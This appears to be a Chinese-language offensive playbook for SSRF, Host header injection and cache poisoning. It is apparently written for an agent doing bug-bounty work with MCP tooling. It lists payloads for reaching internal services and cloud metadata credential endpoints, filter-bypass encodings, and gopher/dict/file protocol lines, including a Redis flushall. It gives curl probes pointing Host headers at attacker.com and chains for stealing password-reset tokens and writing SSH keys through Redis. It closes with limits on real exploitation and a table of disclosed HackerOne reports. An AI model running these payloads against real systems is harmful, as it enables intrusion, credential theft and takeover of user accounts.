# SSRF / Host Header / 缓存投毒 — 决策索引

> 视角:服务端被骗去请求别处。本文件提供execution-framework + 路由表。Host Header 利用、缓存投毒探针、SSRF 通用execution-framework都在这里。**子机制 payload 必须 Read 对应子文件**。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| URL 入参 / 头像抓取 / Webhook / SSO / `url`/`callback`/`return`/`redirect`/`feed`/`image` 等参数让服务端发请求 | `10-ssrf-core.md` |
| 目标是 AWS/GCP/Azure/阿里云/腾讯云/华为云/K8s 元数据 / S3/OSS / AK/SK 凭据利用 / IAM 越权 / 容器逃逸 | `11-cloud.md` |
| 反代 / CDN / Varnish / Cloudflare / Fastly / `Cache-Control` / `Vary` 头 / 静态资源缓存命中规则可控 | `12-cache.md` |
| Host header / X-Forwarded-* 注入(影响密码重置链接、CSRF token、cache key) | 看本 00-index §3.9 §5(Host Header 利用链) |

---


> 视角：黑盒，目标是让目标服务器代我访问内网 / 云元数据 / 投毒缓存

## 1. 一句话说清

- **SSRF**：让服务器替你向"它能到、你不能到"的地方发请求。
- **Host Header 注入**：通过伪造 Host / X-Forwarded-* 让应用错误地构造 URL / 缓存键。
- **缓存投毒**：把恶意响应固化到共享缓存层，让后续用户中招。

渗透价值：未授权 SSRF→云元数据 → P0；缓存投毒（管理后台） → P1。

---

## 2. 高频入口点

### 2.1 SSRF 入口（必查）

```
?url=                ?fetch=
?image=              ?img=
?proxy=              ?source=
?path=               ?file=（如果支持 http://）
?callback=           ?webhook=
?next=               ?redirect=
?continue=           ?return=

功能场景:
- 头像 / 远程图片导入
- URL 预览（聊天 / 评论）
- Webhook 回调测试
- RSS / Atom 订阅
- 远程 PDF / Excel / media导入
- OAuth redirect / SAML ACS
- 服务器端图片处理（ImageMagick）
- PDF 生成（wkhtmltopdf / Puppeteer）
- 邮件预览（Open Graph fetch）
```

### 2.2 Host / X-Forwarded-* 入口

```
Host
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Port
X-Forwarded-Server
X-Real-IP
X-Original-URL
X-Rewrite-URL
True-Client-IP
X-Client-IP
Forwarded: for=...; host=...
```

---

## 3. 探测手法

### 3.1 SSRF 基础探针（先看是否会发出请求）

```bash
# 1. 用自己的 OOB 服务器（webhook.site / Burp Collaborator / interactsh）
url=https://your-oob-domain.com/abc

# 看 OOB 平台是否收到请求
# 收到 → 至少基本 SSRF 存在
```

### 3.2 内网探测

```
# 回环 / 内网
url=http://127.0.0.1
url=http://127.0.0.1:80
url=http://127.0.0.1:8080
url=http://127.0.0.1:6379       # Redis
url=http://127.0.0.1:9200       # ES
url=http://127.0.0.1:8500       # Consul

url=http://localhost
url=http://10.0.0.1
url=http://172.16.0.1
url=http://192.168.0.1
url=http://[::1]
url=http://[::ffff:127.0.0.1]
```

### 3.3 IP 表示绕过

```
# 全是 127.0.0.1 的等价写法
http://127.0.0.1
http://2130706433              # 十进制
http://017700000001            # 八进制
http://0x7f000001              # 十六进制
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://127.1                   # 简写
http://127.0.1
http://[::1]
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### 3.4 域名绕过

```
http://localtest.me            # → 127.0.0.1（公共 DNS）
http://127.0.0.1.nip.io        # → 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
http://attacker.com:8080@127.0.0.1
http://[email protected]@127.0.0.1
```

### 3.5 协议绕过

```
file:///etc/passwd
file://localhost/etc/passwd

dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
gopher://127.0.0.1:25/ ... SMTP

ldap://127.0.0.1:389/
sftp://127.0.0.1:22/
tftp://attacker.com/file
ftp://anonymous:test@target/
```

### 3.6 云元数据（必试，价值最高）

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://instance-data/latest/meta-data/

# AWS IMDSv2（v1 关闭时）
1. PUT http://169.254.169.254/latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. GET ... Header: X-aws-ec2-metadata-token: <token>
   → 大部分 SSRF 不能 PUT，IMDSv2 是有效的缓解

# GCP（必须含 Header: Metadata-Flavor: Google）
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure（必须含 Header: Metadata: true）
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# 华为云
http://169.254.169.254/openstack/latest/meta_data.json

# Kubernetes
http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 3.7 重定向绕过

某些应用会"先校验 URL 域名为 safelist，再发请求"，但跟随 302 重定向到内网：

```python
# attacker.com 上
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/

# 让目标以为请求 attacker.com，但实际跟随到内网
url=https://attacker.com/redirect
```

### 3.8 DNS Rebinding

```
# 用 rbndr.us
url=http://7f000001.c0a80101.rbndr.us
# 第 1 次解析返回 127.0.0.1，第 2 次返回 192.168.1.1
# 应用先解析 → 校验 → 再次解析时变内网

# 自建 rebinder：tartarsauce.org / dnsrebind.lock.cmpxchg8b.com
```

### 3.9 Host Header 注入探针

```bash
# 1. 简单 Host 替换
curl -H "Host: attacker.com" https://target/login -i
# 看响应中是否含 attacker.com（密码重置链接 / 重定向）

# 2. X-Forwarded-Host
curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" https://target/login -i

# 3. 双 Host header
curl -H "Host: target.com" -H "Host: attacker.com" https://target/login -i

# 4. Host + 端口
curl -H "Host: target.com:8080@attacker.com" https://target/login -i
```

**关注**：
- 密码重置 / 邮件中的链接里出现 attacker.com → 用攻击者 Host 控制了重置链接
- 重定向到 attacker.com → 开放重定向
- 缓存（Cache-Control: public）将受污染响应缓存

### 3.10 缓存投毒探针

```bash
# 1. 用 X-Forwarded-Host 注入
curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=1 -i
# 看响应里是否含 attacker.com（在 link、canonical、og:url 等位置）

# 2. 命中缓存
# 多次请求同一路径
for i in {1..3}; do curl -I "https://target/?cb=1"; done
# 看 X-Cache: HIT / Age: > 0

# 3. 路径规范化（Web Cache Deception）
curl -I "https://target/profile.php/.css"
curl -I "https://target/account/.js"
# 如果返回了用户态内容并被缓存，下个匿名用户能读

# 4. 双斜杠
curl -I "https://target//admin"
curl -I "https://target/admin;%2f"
```

---

## 4. Bypass 矩阵（SSRF 详见 strategy/02 第 6 章）

| 拦 | 绕 |
|---|---|
| `127.0.0.1` 字符串拦 | 十进制 / 八进制 / 16 进制 IP |
| `localhost` 拦 | `127.1` / `127.0.0.0.1` / `0.0.0.0` |
| `internal`/`private` 关键字 | DNS Rebinding |
| 仅允许 `https://` | URL 编码 / 双重协议 / 重定向 |
| 域名白名单 | `attacker.com#@target.com`、`@` 用户名段绕过 |
| 仅允许某域 | 子域：`legit-attacker.com.evil.com` 解析 |
| 端口黑名单 | 用 22/80/443 等公共端口的内网服务（gopher://） |
| AWS IMDSv2 | 试 v1：`http://169.254.169.254/latest/meta-data/`，部分老实例没启 v2 |

---

## 5. 利用提权 / 横向

```
基础 SSRF
  → 出网回连证明（DNSLog）
  → 内网端口扫描（http://10.0.0.0/8 各端口）
  → 内网 Redis 写 SSH key（gopher://）
  → 云元数据 → IAM 临时凭据（AWS STS / GCP token）
  → IAM 凭据 → 全云控制
  → S3 / OSS bucket 读写
  → 横向到 Kubernetes API
```

参考真实价值：H1 平台 AWS metadata SSRF 报告 $5k–$50k 普遍。

### Host Header 利用链

```
Host 注入 → 密码重置 URL 含 attacker.com
  → 用户点击重置邮件 → 把 reset_token 发到 attacker.com
  → 攻击者拿 token 重置受害者密码

Host 注入 → 缓存中污染了 og:url
  → 受害者看到分享卡片指向 attacker.com → 钓鱼

Web Cache Deception
  → /account/.css 缓存了 alice 的账户页
  → bob 访问 /account/.css → 看到 alice 的数据
```

---

## 6. 真实案例指纹

| 漏洞 | 指纹 |
|------|------|
| Capital One AWS | SSRF → `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` 拿到 IAM 凭据 → S3 全量数据 |
| Shopify GCP | SSRF → `metadata.google.internal/computeMetadata/v1/` |
| HackerOne SSRF | `?url=` 接受 `http://localhost`，命中内网 Mongo |
| Confluence CVE-2019-3396 | 模板注入 + SSRF |
| Jira CVE-2019-8451 | `/plugins/servlet/gadgets/makeRequest?url=...` |
| WeasyPrint / wkhtmltopdf | PDF 生成器解析 HTML 中 `<img src=>` 触发 SSRF |
| Microsoft Outlook | 邮件预览 / 富文本 fetch SSRF |

通用指纹：
- `?url=https://oob.attacker.cc/x` → OOB 平台收到 → 基本 SSRF
- 收到的 User-Agent 含 `wkhtmltopdf` / `Headless Chrome` / `Java/1.x` → 渲染器/HTTP 客户端
- 试 `file:///etc/passwd` 返回 200 → 协议白名单缺
- 试 `http://169.254.169.254/...` 返回 token JSON → 云 metadata 可达

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 完整请求包（含被 fuzz 的 url 参数）
2. 响应或外带证据（OOB 平台日志截图，含时间、源 IP）
3. 影响升级证明（不实际利用，但展示能拿到的内容）

### 7.2 PoC 模板（云 metadata）

```http
POST /api/preview HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

→ 响应（脱敏）：
HTTP/1.1 200 OK
Content-Type: text/plain

xxx-app-role-prod
（这里证明能拿到 IAM 角色名，未进一步获取临时凭据）
```

### 7.3 Host 注入 PoC

```http
POST /api/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email":"hunter@example.com"}

→ 邮件链接：
https://attacker.com/reset?token=eyJhb...
```

### 7.4 CVSS

```
未授权 SSRF → metadata → 云控制    = 9.8 Critical
未授权 SSRF → 内网端口扫描          CVSS = 7.5
认证 SSRF → 内网                    = 6.5
Host 注入 → 密码重置中毒            = 8.1
缓存投毒 → 用户态泄露                = 7.5
```

### 7.5 影响段

```
通过 /api/preview 接口的 url 参数，攻击者可让服务器代发请求至任意地址。
确认可达：
1. 内网 127.0.0.1 / 10.x.x.x 段服务（端口扫描可行）
2. AWS metadata 端点（已拿到 IAM 角色名 xxx-app-role-prod）
3. 内网 Redis / Mongo 端口（仅做端口可达探测，未发起业务命令）

我未尝试获取 IAM 临时凭据 / 未读取 secret，仅证明可达云 metadata。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__network_intercept` + `mcp__jshook__network_get_requests` | network | 拦截外发请求 / 观察 SSRF 是否实际发出 |
| `mcp__jshook__http2_probe` + `mcp__jshook__http_request_build` | network | HTTP/2 帧构造探测内网 / 绕过过滤 |
| `mcp__jshook__network_replay_request` | network | 重放并修改 host / scheme / port 验证不同协议 |
| `mcp__jshook__proto_infer_state_machine` | protocol-analysis | 自定义协议 SSRF 状态机推断 |

完整映射:[`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：实际拿 IAM 临时凭据后调用 AWS API（`aws s3 ls` 也算）。仅证明可达 metadata 端点。
- **禁**：用 SSRF 触发任何"能改 / 能删"的内网服务（Redis FLUSHALL、写 SSH key、CONFIG SET）。
- **禁**：用 SSRF + gopher 扫整个内网 /8 段。1–3 个目标 IP 验证概念即停。
- **禁**：实际投毒共享缓存（让其他用户看到攻击页面）。在自己的 cache key 上证明能投毒。
- **禁**：Host 注入实际触发用户密码重置邮件（自己邮箱发自己 OK）。
- **限**：SSRF 探测用自己的 OOB 域名，不要用别人的 DNSLog 平台滥用。

## H1 真实案例

_共 108 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | HackerOne | [Server Side Request Forgery (SSRF) via Analytics Reports](https://hackerone.com/reports/2262382) | Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability |
| High | 10000 usd | GitLab | [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) | Summary The Note model has an `attachment` which is provided by a CarrierWave uploader: One of the features this provides is th… |
| High | 6000 usd | Reddit | [Blind SSRF to internal services in matrix preview_link API](https://hackerone.com/reports/1960765) | Summary: Reddit' new chat is based on Matrix software which has preview_link functionality which doesn't filter the URL before … |
| Critical | 3500 usd | Slack | [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) | The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network |
| High | — | GitLab | [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101) | Summary This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response |
| High | 4000 usd | GitLab | [Unauthenticated blind SSRF in OAuth Jira authorization controller](https://hackerone.com/reports/398799) | The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability |
| Critical | — | Vimeo | [SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]](https://hackerone.com/reports/549882) | SSRF leaking internal google cloud data through upload function [SSH Keys, etc..] |
| Critical | — | Evernote | [Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion](https://hackerone.com/reports/1189367) | Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion |
| Critical | — | GitLab | [Full Read SSRF on Gitlab's Internal Grafana](https://hackerone.com/reports/878779) | Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerabl… |
| High | — | Omise | [SSRF in webhooks leads to AWS private keys disclosure](https://hackerone.com/reports/508459) | Vulnerability Summary Omise makes use of Amazon AWS as their application environment |
| Critical | 3000 usd | Lark Technologies | [Stored XSS & SSRF in Lark Docs](https://hackerone.com/reports/892049) | Stored XSS & SSRF in Lark Docs |
| High | 2727 usd | TikTok | [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) | External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing |

**命中本类的 weakness 分布：**

- Server-Side Request Forgery (SSRF)：93 条
- Uncategorized → 手工归类：13 条
- Externally Controlled Reference to a Resource in Another Sphere：2 条



---

完整 Payload 库见同级子文件。
